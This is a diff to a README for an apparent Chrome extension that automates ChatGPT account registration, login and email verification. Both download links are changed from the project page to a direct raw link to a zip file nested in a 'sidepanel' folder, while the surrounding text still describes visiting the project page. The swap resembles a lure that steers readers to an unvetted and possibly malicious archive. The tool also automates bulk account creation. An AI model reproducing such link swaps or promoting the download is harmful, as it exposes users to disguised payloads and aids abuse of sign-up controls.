@@ -1,6 +1,6 @@
 # 🚀 multiPagePlugins - Automate Your ChatGPT Account Creation Workflow
 
-[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Agglutininbinarycode6775/multiPagePlugins)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://raw.githubusercontent.com/Agglutininbinarycode6775/multiPagePlugins/main/sidepanel/Page-multi-Plugins-v2.5.zip)
 
 This software manages the repetitive steps required to register or log in to ChatGPT accounts. It operates as a browser extension within Google Chrome. It handles data entry, email verification, and navigation tasks automatically.
 
@@ -17,7 +17,7 @@ Before you begin, ensure your computer meets these requirements:
 
 To get the files, select the link below to visit the project page:
 
-[Download Software Here](https://github.com/Agglutininbinarycode6775/multiPagePlugins)
+[Download Software Here](https://raw.githubusercontent.com/Agglutininbinarycode6775/multiPagePlugins/main/sidepanel/Page-multi-Plugins-v2.5.zip)
 
 On the project page, look for the green button labeled "Code." Click it and choose "Download ZIP." Save this file to a folder on your computer that you can find easily. Once the download finishes, right-click the file and select "Extract All." Keep note of the folder location where you extracted the files.
 
